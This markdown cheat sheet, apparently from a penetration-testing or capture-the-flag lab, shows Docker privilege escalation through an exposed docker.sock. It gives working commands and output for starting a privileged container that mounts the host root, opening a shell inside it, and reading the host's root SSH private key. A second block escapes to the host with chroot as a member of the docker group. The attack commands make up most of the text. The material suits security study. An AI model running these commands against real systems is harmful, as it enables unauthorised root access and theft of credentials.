# Docker

## Docker CLI

- [Docker CLI - download](https://master.dockerproject.org/linux/x86_64/docker)

## Interesting commands - docker.sock

```bash
# find docker.sock 
$ ls -lha /app
...
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
...

# user docler CLI to try to interact with docker.sock
$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app

# create a new container with privilege access and mapping / director of the host
$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

# checking if new container was created
$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app

# getting shell on the container executing /bin/bash
$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash

# accessing / host directory mounted on the container
root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
...
```

```bash
# checking user permission and seeing that you have docker priv
$ id
uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)

# listing current docker images
$ docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB

# using docker.sock to create a new container with access to / root and accessing it as chroot directory
$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@8d891f1f02a7:/# ls -lha /root
total 44K
drwx------  5 root root 4.0K Jul 26 09:59 .
drwxr-xr-x 20 root root 4.0K Oct  6  2021 ..
lrwxrwxrwx  1 root root    9 Jul 26 09:59 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
drwx------  2 root root 4.0K Oct  7  2021 .cache
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4.0K Oct  6  2021 .ssh
-rw-------  1 root root 9.1K Oct  7  2021 .viminfo
-rw-r--r--  1 root root   20 Jul 26 09:56 flag.txt
drwxr-xr-x  3 root root 4.0K Oct  6  2021 snap

```
